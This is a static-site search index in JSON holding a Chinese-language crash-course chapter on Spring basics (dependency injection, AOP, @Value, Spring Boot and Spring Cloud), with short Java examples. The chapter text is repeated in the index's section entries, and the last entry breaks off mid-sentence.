{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"01/","text":"Spring \u901f\u6210 Ch1 \u56de\u5230 Spring \u7b80\u4ecb \u672c\u7cfb\u5217\u7528\u6700\u5feb\u7684\u901f\u5ea6\u8fc7\u4e00\u904d Spring Cloud\uff0cSpring \u7ec4\u4ef6\u548c\u5fae\u670d\u52a1\u6280\u672f\u3002 \u7f51\u4e0a\u73b0\u6709\u5f88\u591a\u6559\u7a0b\u90fd\u8bb2\u7684\u592a\u7ec6\u592a\u590d\u6742\uff0c\u91cd\u70b9\u662f\u592a\u957f\u4e86\uff0c\u4e0d\u9002\u5408\u5feb\u901f\u5165\u95e8\u3002\u672c\u7cfb\u5217\u5c06\u5c3d\u91cf\u7b80\u5316\uff0c\u53ea\u8bb2\u6700\u91cd\u8981\u7684\u90e8\u5206\u3002 \u672c\u6587\u5047\u8bbe\u4f60\u4f1a\u6700\u57fa\u7840\u7684 Spring Web\uff0c\u53ea\u8981\u4f1a\u7528 Spring Web \u5f00\u53d1\u4e00\u4e2a\u7b80\u5355\u7684 RESTful \u670d\u52a1\u5c31\u53ef\u4ee5\u4e86\u3002\u6b64\u5916\uff0c\u4f60\u9700\u8981\u4f1a\u4f7f\u7528 docker\uff0c\u56e0\u4e3a\u6211\u4eec\u4f1a\u7528\u5230 docker \u6765\u542f\u52a8\u4e00\u4e9b\u670d\u52a1\uff0c\u800c\u4e14 k8s \u4e2d\u4e5f\u4e0d\u4f1a\u8bb2 docker\u3002\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u628a\u8fd9\u4e9b\u670d\u52a1\u90e8\u7f72\u5230\u4e91\u4e0a\u6216\u672c\u673a\uff0c\u4f46\u8fd9\u7cfb\u5217\u6587\u7ae0\u4e2d\u53ea\u4f1a\u63d0\u4f9b docker-compose \u6587\u4ef6\u3002 \u4f46\u662f\u5728\u8bb2\u89e3 Spring Cloud \u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5b66\u4e60\u4e00\u4e9b\u901f\u6210 Spring Boot \u53ef\u80fd\u6ca1\u8bb2\u5230\u7684 Spring \u7684\u57fa\u7840\u77e5\u8bc6\u3002 Spring \u7b80\u4ecb Spring \u662f\u4e00\u4e2a Java \u5f00\u53d1\u6846\u67b6\uff0c\u5b83\u63d0\u4f9b\u4e86\u5f88\u591a\u529f\u80fd\uff0c\u6bd4\u5982\u4f9d\u8d56\u6ce8\u5165\u3001AOP\u3001\u4e8b\u52a1\u7ba1\u7406\u7b49\u7b49\u3002\u5176\u4e2d\u6700\u91cd\u8981\u7684\u662f\u4f9d\u8d56\u6ce8\u5165\uff0c\u8fd9\u662f Spring \u7684\u6838\u5fc3\u529f\u80fd\u3002 Spring \u5305\u542b\u4e86\u5f88\u591a\u5305\uff0c\u4f8b\u5982 Spring Web\u3001Spring Data\u3001Spring Security \u7b49\u7b49\u3002 \u4f9d\u8d56\u6ce8\u5165 Spring \u7684\u4f9d\u8d56\u6ce8\u5165\u662f\u901a\u8fc7 Bean \u5b9e\u73b0\u7684\uff0c\u5177\u4f53\u800c\u8a00\uff0c\u4f60\u53ef\u4ee5\u521b\u5efa\u8bb8\u591a Config \u7c7b\uff0c\u6bcf\u4e2a Config \u7c7b\u90fd\u53ef\u4ee5\u6709\u591a\u4e2a Bean \u65b9\u6cd5\uff0c\u6bcf\u4e2a Bean \u65b9\u6cd5\u90fd\u89c4\u5b9a\u4e86\u67d0\u4e00\u7c7b\u5bf9\u8c61\u7684\u521b\u5efa\u65b9\u5f0f\u3002Spring \u4f1a\u5728\u542f\u52a8\u65f6\u626b\u63cf\u6240\u6709\u7684 Config \u7c7b\uff0c\u7136\u540e\u6839\u636e Bean \u65b9\u6cd5\u7684\u89c4\u5219\u521b\u5efa\u5bf9\u8c61\u3002 @Configuration class MyConfig { @Bean public MyService myService() { return new MyService(); } } \u8fd9\u6837\uff0c\u5c31\u89c4\u5b9a\u4e86\u5f53 MyService \u5bf9\u8c61\u4f7f\u7528\u6ce8\u5165\u65b9\u6cd5\u521b\u5efa\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u8c03\u7528 myService \u65b9\u6cd5\u521b\u5efa\u7684\u3002 \u5982\u679c\u8981\u7528\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u6cd5\u83b7\u5f97\u6ce8\u5165\u7684\u5bf9\u8c61\uff0c\u4f7f\u7528 Spring Application Context\u3002 public class SomeClass { public void someFunc() { ApplicationContext context = new AnnotationConfigApplicationContext(MyConfig.class); MyService myService = context.getBean(MyService.class); } } Application Context \u5305\u542b\u4e86\u6240\u6709\u7684 Bean \u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7 getBean \u65b9\u6cd5\u83b7\u5f97\u3002\u4e0a\u9762\u4e00\u79cd\u4f7f\u7528\u7684\u662f\u57fa\u4e8e Annotation\uff0c\u5373 Configuration \u6ce8\u89e3\u7c7b\u83b7\u5f97 Context \u5bf9\u8c61\uff0c\u7136\u540e\u57fa\u4e8e\u7c7b\u5bf9\u8c61\u53cd\u5c04\u83b7\u5f97 Bean \u5bf9\u8c61\u3002 Spring \u4e5f\u652f\u6301 XML \u914d\u7f6e\uff0c\u5373\u5728 XML \u6587\u4ef6\u4e2d\u914d\u7f6e Bean \u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7 XML \u6587\u4ef6\u83b7\u5f97 Context \u5bf9\u8c61\uff0c\u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u5df2\u7ecf\u4e0d\u5e38\u7528\u4e86\u3002 <beans> <bean id=\"myService\" class=\"com.example.MyService\"/> </beans> public class SomeClass { public void someFunc() { ApplicationContext context = new ClassPathXmlApplicationContext(\"my-config.xml\"); MyService myService = context.getBean(MyService.class); } } \u8fd9\u91cc\u4e5f\u53ef\u4ee5\u4e0d\u57fa\u4e8e\u7c7b\u5bf9\u8c61\u83b7\u5f97 Bean \u5bf9\u8c61\uff0c\u800c\u662f\u57fa\u4e8e Bean \u7684 ID \u83b7\u5f97\u3002 MyService myService = (MyService) context.getBean(\"myService\"); \u5f53\u7136\uff0c\u6ce8\u89e3\u91cc\u4e5f\u53ef\u4ee5\u6539\u53d8 Bean \u7684 ID\u3002 @Bean(name = \"myService\") public MyService myService() { return new MyService(); } \u9664\u4e86\u624b\u52a8\u521b\u5efa\u914d\u7f6e\u7c7b\uff0c\u8fd8\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 @Component \u6ce8\u89e3\u3002\u8fd9\u4e2a\u6ce8\u89e3\u672c\u8eab\u5e76\u4e0d\u505a\u4ec0\u4e48\uff0c\u53ea\u6709\u4e00\u4e2a value \u5c5e\u6027\u3002\u5982\u679c\u4e0d\u5199\uff0c\u9ed8\u8ba4\u7528\u7c7b\u540d\u9996\u5b57\u6bcd\u5c0f\u5199\u4f5c\u4e3a Bean \u7684 ID\u3002 @Component(\"myService\") public class MyService { } \u6211\u4eec\u5e38\u7528\u7684\u4e00\u4e9b\u6ce8\u89e3\uff0c\u5982 @RestController \uff0c @Service \uff0c @Repository \uff0c @Configuration \uff0c\u90fd\u5305\u542b\u4e86 @Component \u3002 \u4f46\u662f\uff0cSpring \u6709\u53e6\u4e00\u4e2a\u6ce8\u89e3 @ComponentScan \uff0c\u8fd9\u4e2a\u6ce8\u89e3\u4f1a\u626b\u63cf\u6307\u5b9a\u5305\u4e0b\u7684\u6240\u6709 @Component \u6ce8\u89e3\u7c7b\uff0c\u5e76\u5c06\u5176\u6ce8\u518c\u4e3a Bean \u5bf9\u8c61\u5230\u5f53\u524d\u8fd9\u4e2a\u7c7b\u4e0b\u3002\u4f8b\u5982\uff0c @ComponentScan(\"com.example\") @Configuration public class MyConfig { } Bean \u7684\u540d\u5b57\u5c31\u662f Component \u7684 value \u5c5e\u6027\u3002\u4e4b\u540e\u5c31\u540c\u4e4b\u524d\u4e00\u6837\u83b7\u5f97\u4e0a\u4e0b\u6587\u548c\u5bf9\u8c61\u5373\u53ef\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u6bcf\u4e2a Spring \u542f\u52a8\u7684 run \u65b9\u6cd5\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a Application Context\uff0c\u8fd9\u4e2a Context \u5305\u542b\u4e86\u6240\u6709\u7684 Bean \u5bf9\u8c61\u3002 @SpringBootApplication public class DemoApplication { public static void main(String[] args) { ApplicationContext context = SpringApplication.run(DemoApplication.class, args); } } \u524d\u9762\u6211\u4eec\u8bf4\u8fc7\uff0ccontext \u9700\u8981\u57fa\u4e8e Config \u7c7b\u521b\u5efa\uff0c\u90a3\u8fd9\u91cc\u7684 Context \u7684 Config \u5728\u54ea\u91cc\uff1f\u5982\u679c\u4f60\u53bb\u67e5\u770b @SpringBootApplication \u7684\u6e90\u7801\uff0c\u4f60\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u6ce8\u89e3\u662f\u8fd9\u6837\u7684\uff0c @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(excludeFilters = { @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class), @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) }) public @interface SpringBootApplication { // ... } \u662f\u7684\uff0c\u5b83\u672c\u8eab\u5c31\u6709 @ComponentScan \u6ce8\u89e3\u3002\u6b64\u5916\uff0c\u5982\u679c\u518d\u53bb\u770b @SpringBootConfiguration \uff0c\u4f60\u4f1a\u53d1\u73b0\u5b83\u5305\u542b\u4e86 @Configuration \u6ce8\u89e3\u3002\u6240\u4ee5\uff0c @SpringBootApplication \u5305\u542b\u4e86 @Configuration \u548c @ComponentScan \u3002 \u5f53\u7136\uff0c\u6bd4\u8d77\u8fd9\u79cd\u4f20\u7edf\u7684\u521b\u5efa Bean \u7684\u65b9\u6cd5\uff0c\u4f60\u5e94\u8be5\u66f4\u719f\u6089 @Resource \u3001 @Autowired \u3001 @Qualifier \u3001 @Inject \u7b49\u6ce8\u89e3\u3002\u8fd9\u4e9b\u6ce8\u89e3\u662f Spring \u7684\u4f9d\u8d56\u6ce8\u5165\u7684\u6838\u5fc3\u3002 @Inject \u548c @Autowired \u662f\u7b49\u4ef7\u7684\uff0c\u662f\u4f9d\u8d56\u7c7b\u578b\u6ce8\u5165\uff0c\u5206\u522b\u7531 Java \u548c Spring \u63d0\u4f9b\u3002 @Resource \u548c @Qualifier \u662f\u4f9d\u8d56\u540d\u79f0\u6ce8\u5165\uff0c\u5206\u522b\u7531 Java \u548c Spring \u63d0\u4f9b\u3002\u4e00\u822c\u63a8\u8350\u4f7f\u7528 Spring \u63d0\u4f9b\u7684\u6ce8\u89e3\u3002 @Autowired \u548c @Qualifier \u7684\u7528\u6cd5\u57fa\u672c\u76f8\u540c\uff0c\u53ea\u662f\u4f9d\u8d56 ID \u548c\u7c7b\u540d\u7684\u533a\u522b\u3002 @Component public class SomeClass { } public class AnotherClass { @Autowired private final SomeClass someClass; public void someFunc(@Autowired @Qualifier(\"someClass\") SomeClass someClass) { this.someClass = someClass; } } \u6839\u636e Spring \u7684 \u5b98\u65b9\u6587\u6863 \uff0c\u8fd8\u6709 setter \u6ce8\u5165\u6cd5\u7b49\u7b49\u3002\u4f46\u662f\uff0c\u6700\u63a8\u8350\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u6784\u5efa\u5668\u6ce8\u5165\u52a0\u4e0d\u53ef\u53d8\u79c1\u6709\u5b57\u6bb5\u3002\u5373\u4e0b\u9762\u8fd9\u79cd\u65b9\u6cd5\u3002 @Component public class SomeClass { } public class AnotherClass { private final SomeClass someClass; @Autowired public AnotherClass(SomeClass someClass) { this.someClass = someClass; } } \u6216\uff0c public class AnotherClass { private final SomeClass someClass; public AnotherClass(@Autowired SomeClass someClass) { this.someClass = someClass; } } \u6216\u8005\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 lombok \u7684 @RequiredArgsConstructor \u6ce8\u89e3\u3002 @RequiredArgsConstructor public class AnotherClass { private final SomeClass someClass; } AOP (Aspect-Oriented Programming) AOP \u5373 Aspect-Oriented Programming\uff0c\u9762\u5411\u5207\u9762\u7f16\u7a0b\u3002\u8fd9\u53ea\u662f\u8bbe\u8ba1\u6a21\u5f0f\u4e2d \u6a21\u7248\u65b9\u6cd5\u6a21\u5f0f \u7684\u4e00\u79cd\u5b9e\u73b0\uff0c\u5373\u5728\u65b9\u6cd5\u6267\u884c\u524d\u540e\u63d2\u5165\u4e00\u4e9b\u4ee3\u7801\u3002 Spring \u7684 AOP \u662f\u57fa\u4e8e\u4ee3\u7406\u7684\uff0c\u5373\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u4ee3\u7406\u5bf9\u8c61\u7684\u65b9\u6cd5\u4e2d\u63d2\u5165\u4e00\u4e9b\u4ee3\u7801\u3002 \u5177\u4f53\u800c\u8a00\uff0c\u5982\u679c\u8981\u4e3a\u67d0\u4e2a\u7c7b\u7684\u67d0\u4e2a\u65b9\u6cd5\u6dfb\u52a0\u5207\u9762\uff0c\u5373\u5728\u4e0d\u6539\u53d8\u539f\u6709\u65b9\u6cd5\u7684\u60c5\u51b5\u4e0b\u6dfb\u52a0\u4e00\u4e9b\u4ee3\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528 @Aspect \u6ce8\u89e3\u3002 @Aspect @Component public class MyAspect { @Before(\"com.example.MyService.s\") public void before() { System.out.println(\"Before\"); } @After(\"execution(* com.example.MyService.*(..))\", returning = \"retVal\") public void after(Object retVal) { System.out.println(\"After: \" + retVal); } } \u6ce8\u610f\uff0c\u5207\u9762\u7c7b\u53ea\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u66f4\u6539\u4e86\u539f\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002\u5982\u679c\u76f4\u63a5\u4f7f\u7528\u539f\u7c7b\u6765\u521b\u5efa\u5bf9\u8c61\uff0c\u5207\u9762\u662f\u4e0d\u4f1a\u751f\u6548\u7684\u3002 @After \u548c @Before \u91cc\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5207\u5165\u70b9\u8868\u8fbe\u5f0f\uff0c\u5373\u8981\u5207\u5165\u7684\u65b9\u6cd5\u3002 execution( com.example.service. .*(..))\uff1a\u5339\u914dcom.example.service\u5305\u4e0b\u6240\u6709\u7c7b\u7684\u6240\u6709\u65b9\u6cd5\u3002 within(com.example.service..*)\uff1a\u5339\u914dcom.example.service\u5305\u53ca\u5176\u5b50\u5305\u4e0b\u7684\u6240\u6709\u7c7b\u7684\u6240\u6709\u65b9\u6cd5\u3002 bean(myBean)\uff1a\u5339\u914d\u540d\u4e3amyBean\u7684bean\u7684\u6240\u6709\u65b9\u6cd5\u3002 @annotation(org.springframework.transaction.annotation.Transactional)\uff1a\u5339\u914d\u6240\u6709\u5e26\u6709@Transactional\u6ce8\u89e3\u7684\u65b9\u6cd5\u3002 After \u7684 returning \u5c5e\u6027\u662f\u8fd4\u56de\u503c\uff0c\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u8fd4\u56de\u503c\u3002 \u8fd9\u6837\u5b50\u521b\u5efa\u5207\u9762\u7c7b\u540e\uff0cSpring \u4f1a\u5728\u8fd0\u884c\u65f6\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u4ee3\u7406\u5bf9\u8c61\u7684\u65b9\u6cd5\u4e2d\u63d2\u5165\u4e00\u4e9b\u4ee3\u7801\u3002 \u8981\u4f7f\u7528\u8fd9\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u9700\u8981\u5728 @SpringBootApplication \u7c7b\u4e2d\u6dfb\u52a0 @EnableAspectJAutoProxy \u6ce8\u89e3\u3002 @SpringBootApplication @EnableAspectJAutoProxy public class DemoApplication { public static void main(String[] args) { ApplicationContext context = SpringApplication.run(DemoApplication.class, args); } } \u8fd9\u6837\uff0c\u4f7f\u7528 @Autowired \u6ce8\u5165\u7684\u5bf9\u8c61\u5c31\u662f\u4ee3\u7406\u5bf9\u8c61\u4e86\u3002 \u7531\u4e8e AOP \u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\u7528\u7684\u4e0d\u591a\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u5c55\u5f00\u8bb2\u89e3\u4e86\u3002 Value \u6ce8\u89e3 \u867d\u7136 @Value \u6ce8\u89e3\u5e76\u4e0d\u80fd\u7b97\u662f Spring \u7684\u6838\u5fc3\u529f\u80fd\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\u7528\u7684\u5f88\u591a\uff0c\u56e0\u6b64\u8fd9\u91cc\u4e5f\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u3002 @Value \u6ce8\u89e3\u53ef\u4ee5\u7528\u6765\u6ce8\u5165\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u5c5e\u6027\u3002 @Component public class MyService { @Value(\"${my.property}\") private String property; } \u8fd9\u6837\uff0cSpring \u4f1a\u5728\u542f\u52a8\u65f6\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 my.property \u5c5e\u6027\uff0c\u5e76\u5c06\u5176\u6ce8\u5165\u5230 property \u5b57\u6bb5\u4e2d\u3002\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u5c31\u662f application.yml \uff0c\u6216 bootstrap.yml \uff08\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u683c\u5f0f\u7684\u6587\u4ef6\uff09\u3002\u540e\u8005\u662f\u5728\u4e4b\u540e\u7684 Spring Cloud \u4e2d\u7528\u5230\u7684\u3002\u5982\u679c\u914d\u7f6e\u6587\u4ef6\u6ca1\u6709\uff0c\u8fd8\u4f1a\u627e\u73af\u5883\u53d8\u91cf\uff0c\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u70b9\u53f7\u4f1a\u88ab\u9ed8\u8ba4\u66ff\u6362\u4e3a\u4e0b\u5212\u7ebf\u3002 my: property: value \u7b49\u4ef7\u4e8e\u6709\u4e00\u4e2a\u73af\u5883\u53d8\u91cf MY_PROPERTY \uff0c\u503c\u4e3a value \u3002 \u4f46\u662f\uff0c\u8fd9\u6837\u5b50\u53ea\u80fd\u6ce8\u5165\u5b57\u7b26\u4e32\u3002\u5982\u679c\u8981\u6ce8\u5165\u5176\u5b83\u7c7b\u578b\uff0c\u4f8b\u5982\u4e00\u4e2a\u6574\u6570\uff0c\u9700\u8981\u4f7f\u7528 Spring \u503c\u8868\u8fbe\u5f0f\uff0c\u5373 #{} \u3002 @Component public class MyService { @Value(\"#{${my.property} + 1}\") private int property; } \u8fd9\u4e2a\u542b\u4e49\u662f\uff0c\u5c06 my.property \u7684\u503c\u52a0\u4e00\u540e\u6ce8\u5165\u5230 property \u5b57\u6bb5\u4e2d\u3002 Spring Boot \u7b80\u4ecb Spring Boot \u4e0d\u662f Spring \u7684\u67d0\u4e2a\u6a21\u5757\u3002\u800c\u662f Spring \u7684\u67d0\u4e2a\u6a21\u5757\u52a0\u4e0a\u4e00\u4e9b\u9ed8\u8ba4\u914d\u7f6e\u3002\u4ee5 Spring Data JPA \u4e3e\u4f8b\uff0c\u5b83\u7684\u6838\u5fc3\u529f\u80fd\u5728 org.springframework.data:spring-data-jpa \uff0c\u5373 \u8fd9\u4e2a maven repository \uff0c\u800c Spring Boot Starter Data JPA \u662f Spring Data JPA \u52a0\u4e0a\u4e00\u4e9b\u9ed8\u8ba4\u914d\u7f6e\uff0c\u5b83\u5728 org.springframework.boot:spring-boot-starter-data-jpa \uff0c\u5373 \u8fd9\u4e2a maven repository \u3002 \u53ef\u4ee5\u8fd9\u6837\u6253\u6bd4\u65b9\uff0cSpring Framework \u662f\u94a2\u7b4b\u6df7\u6ce5\u571f\u6846\u67b6\uff0c\u5176\u4e2d\u7684\u5185\u9970\u3001\u5bb6\u5177\u3001\u7535\u5668\u7b49\u7b49\u90fd\u662f Spring \u7684\u5404\u79cd\u6a21\u5757\uff0c\u4f8b\u5982 Spring Web\u3001Spring Data\u3001Spring Security \u7b49\u7b49\u3002\u6bcf\u4e2a\u6a21\u5757\u7684 Spring Boot Starter \u5305\u5373\u662f\u5305\u542b\u4e86\u88c5\u4fee\u670d\u52a1\u7684\u5185\u9970\u3001\u5bb6\u5177\u3001\u7535\u5668\u7b49\u7b49\u3002\u5982\u679c\u5b89\u88c5\u5b8c\u4f60\u89c9\u5f97\u4e0d\u6ee1\u610f\uff0c\u4f60\u53ef\u4ee5\u81ea\u5df1\u518d\u505a\u5c0f\u6539\u52a8\uff0c\u800c\u4e0d\u5fc5\u4ece\u5934\u81ea\u5df1\u5b8c\u6210\u6240\u6709\u7684\u88c5\u4fee\u5de5\u4f5c\u3002 \u5177\u4f53\u5230\u7f16\u7a0b\u4e0a\uff0cSpring Boot Starter \u7248\u7684\u5de5\u5177\u9664\u4e86\u539f\u672c\u7684\u6846\u67b6\u5916\uff0c\u8fd8\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u9ed8\u8ba4\u7684 Config \u7c7b\uff0c\u5982\u679c\u9700\u8981\u81ea\u5b9a\u4e49\uff0c\u53ea\u9700\u8981\u521b\u5efa\u4e00\u4e2a Config \u7c7b\uff0c\u7136\u540e\u5728\u5176\u4e2d\u6dfb\u52a0 @Bean \u6ce8\u89e3\uff0c\u8986\u76d6\u6389\u9ed8\u8ba4\u7684 Bean \u5bf9\u8c61\u5373\u53ef\u3002 Spring Boot \u914d\u7f6e\u7684\u4f18\u5148\u7ea7\u987a\u5e8f\u662f\uff0c \u547d\u4ee4\u884c\u53c2\u6570 application.properties\u6216application.yml\uff08\u5728config\u5b50\u76ee\u5f55\u6216\u5f53\u524d\u76ee\u5f55\uff09 application.properties\u6216application.yml\uff08\u5728\u7c7b\u8def\u5f84\u7684\u6839\u76ee\u5f55\uff09 \u901a\u8fc7@PropertySource\u6ce8\u89e3\u52a0\u8f7d\u7684\u5c5e\u6027\u6587\u4ef6 \u9ed8\u8ba4\u5c5e\u6027\uff08\u901a\u8fc7SpringApplication.setDefaultProperties\u6307\u5b9a\uff09 Spring Framework \u81ea\u5df1\u4e5f\u6709\u8bb8\u591a\u7684\u914d\u7f6e\uff0c\u4f8b\u5982\u6211\u4eec\u4e0a\u9762\u8bb2\u7684 @Configuration \u3001 @Bean \u7b49\u7b49\uff0c\u56e0\u6b64\u5b83\u4e5f\u6709\u81ea\u5df1\u7684 Spring Boot Starter\uff0c\u5373 org.springframework.boot:spring-boot-starter \u3002 \u6ce8\u610f\uff0c\u6240\u6709\u7684 Spring Boot \u90fd\u5fc5\u987b\u7edf\u4e00\u4e00\u4e2a\u7248\u672c\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u5404\u79cd\u95ee\u9898\u3002\u5b83\u4eec\u7684\u7248\u672c\u53f7\u603b\u662f\u4fdd\u6301\u4e00\u81f4\u7684\u3002 Spring Cloud \u7b80\u4ecb Spring Cloud \u4e0e\u5176\u8bf4\u662f\u4e00\u4e2a\u7edf\u4e00\u7684\u6846\u67b6\uff0c\u4e0d\u5982\u8bf4\u662f\u4e00\u7cfb\u5217\u5de5\u5177\u7684\u96c6\u5408\u3002\u8fd9\u4e9b\u5de5\u5177\u90fd\u662f\u4e3a\u4e86\u89e3\u51b3\u5fae\u670d\u52a1\u67b6\u6784\u4e2d\u7684\u4e00\u4e9b\u95ee\u9898\u800c\u8bbe\u8ba1\u7684\u3002 \u8fd9\u4e00\u7cfb\u5217\u5de5\u5177\u4e2d\uff0c\u6709\u4e00\u4e9b\u7c7b\u4f3c\u4e8e\u7f16\u7a0b\u4e2d\u7684\u63a5\u53e3\uff0c\u6709\u4e00\u4e9b\u7c7b\u4f3c\u4e8e\u8fd9\u4e9b\u63a5\u53e3\u7684\u5b9e\u73b0\u3002\u4f8b\u5982\uff0cSpring Cloud Circuit Breaker \u662f\u7c7b\u4f3c\u4e8e\u63a5\u53e3\uff0c\u5b83\u6709\u5b9e\u73b0 Resilience4j \u548c Hystrix\u3002\u5f53\u7136\uff0c\u6709\u4e00\u4e9b\u5de5\u5177\u662f\u6ca1\u6709\u7edf\u4e00\u7684\u63a5\u53e3\u7684\uff0c\u4f8b\u5982\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\uff0cConsul\uff0cNacos\uff0cEureka \u662f\u4e09\u4e2a\u5b9e\u73b0\uff0c\u4f46\u4ed6\u4eec\u4e0d\u9075\u5faa\u7edf\u4e00\u7684\u63a5\u53e3\u3002 \u5f53\u6211\u4eec\u8bf4 Spring Cloud \u65f6\uff0c\u8fd9\u4e5f\u662f\u4e00\u4e2a\u7c7b\u4f3c\u4e0e\u63a5\u53e3\u7684\u4e1c\u897f\uff0c\u5b83\u4e5f\u6709\u5b9e\u73b0\uff0c\u4f8b\u5982 Spring Cloud Netflix\uff0cSpring Cloud Alibaba \u7b49\u7b49\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u81ea\u5df1\u9009\u62e9\u4e00\u4e9b\u5de5\u5177\u6765\u7ec4\u5408\uff0c\u5b8c\u6210 Spring Cloud \u7684\u529f\u80fd\u3002","title":"\u56de\u5230 Spring"},{"location":"01/#spring-ch1-spring","text":"","title":"Spring \u901f\u6210 Ch1 \u56de\u5230 Spring"},{"location":"01/#_1","text":"\u672c\u7cfb\u5217\u7528\u6700\u5feb\u7684\u901f\u5ea6\u8fc7\u4e00\u904d Spring Cloud\uff0cSpring \u7ec4\u4ef6\u548c\u5fae\u670d\u52a1\u6280\u672f\u3002 \u7f51\u4e0a\u73b0\u6709\u5f88\u591a\u6559\u7a0b\u90fd\u8bb2\u7684\u592a\u7ec6\u592a\u590d\u6742\uff0c\u91cd\u70b9\u662f\u592a\u957f\u4e86\uff0c\u4e0d\u9002\u5408\u5feb\u901f\u5165\u95e8\u3002\u672c\u7cfb\u5217\u5c06\u5c3d\u91cf\u7b80\u5316\uff0c\u53ea\u8bb2\u6700\u91cd\u8981\u7684\u90e8\u5206\u3002 \u672c\u6587\u5047\u8bbe\u4f60\u4f1a\u6700\u57fa\u7840\u7684 Spring Web\uff0c\u53ea\u8981\u4f1a\u7528 Spring Web \u5f00\u53d1\u4e00\u4e2a\u7b80\u5355\u7684 RESTful \u670d\u52a1\u5c31\u53ef\u4ee5\u4e86\u3002\u6b64\u5916\uff0c\u4f60\u9700\u8981\u4f1a\u4f7f\u7528 docker\uff0c\u56e0\u4e3a\u6211\u4eec\u4f1a\u7528\u5230 docker \u6765\u542f\u52a8\u4e00\u4e9b\u670d\u52a1\uff0c\u800c\u4e14 k8s \u4e2d\u4e5f\u4e0d\u4f1a\u8bb2 docker\u3002\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u628a\u8fd9\u4e9b\u670d\u52a1\u90e8\u7f72\u5230\u4e91\u4e0a\u6216\u672c\u673a\uff0c\u4f46\u8fd9\u7cfb\u5217\u6587\u7ae0\u4e2d\u53ea\u4f1a\u63d0\u4f9b docker-compose \u6587\u4ef6\u3002 \u4f46\u662f\u5728\u8bb2\u89e3 Spring Cloud \u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5b66\u4e60\u4e00\u4e9b\u901f\u6210 Spring Boot \u53ef\u80fd\u6ca1\u8bb2\u5230\u7684 Spring \u7684\u57fa\u7840\u77e5\u8bc6\u3002","title":"\u7b80\u4ecb"},{"location":"01/#spring","text":"Spring \u662f\u4e00\u4e2a Java \u5f00\u53d1\u6846\u67b6\uff0c\u5b83\u63d0\u4f9b\u4e86\u5f88\u591a\u529f\u80fd\uff0c\u6bd4\u5982\u4f9d\u8d56\u6ce8\u5165\u3001AOP\u3001\u4e8b\u52a1\u7ba1\u7406\u7b49\u7b49\u3002\u5176\u4e2d\u6700\u91cd\u8981\u7684\u662f\u4f9d\u8d56\u6ce8\u5165\uff0c\u8fd9\u662f Spring \u7684\u6838\u5fc3\u529f\u80fd\u3002 Spring \u5305\u542b\u4e86\u5f88\u591a\u5305\uff0c\u4f8b\u5982 Spring Web\u3001Spring Data\u3001Spring Security \u7b49\u7b49\u3002","title":"Spring \u7b80\u4ecb"},{"location":"01/#_2","text":"Spring \u7684\u4f9d\u8d56\u6ce8\u5165\u662f\u901a\u8fc7 Bean \u5b9e\u73b0\u7684\uff0c\u5177\u4f53\u800c\u8a00\uff0c\u4f60\u53ef\u4ee5\u521b\u5efa\u8bb8\u591a Config \u7c7b\uff0c\u6bcf\u4e2a Config \u7c7b\u90fd\u53ef\u4ee5\u6709\u591a\u4e2a Bean \u65b9\u6cd5\uff0c\u6bcf\u4e2a Bean \u65b9\u6cd5\u90fd\u89c4\u5b9a\u4e86\u67d0\u4e00\u7c7b\u5bf9\u8c61\u7684\u521b\u5efa\u65b9\u5f0f\u3002Spring \u4f1a\u5728\u542f\u52a8\u65f6\u626b\u63cf\u6240\u6709\u7684 Config \u7c7b\uff0c\u7136\u540e\u6839\u636e Bean \u65b9\u6cd5\u7684\u89c4\u5219\u521b\u5efa\u5bf9\u8c61\u3002 @Configuration class MyConfig { @Bean public MyService myService() { return new MyService(); } } \u8fd9\u6837\uff0c\u5c31\u89c4\u5b9a\u4e86\u5f53 MyService \u5bf9\u8c61\u4f7f\u7528\u6ce8\u5165\u65b9\u6cd5\u521b\u5efa\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u8c03\u7528 myService 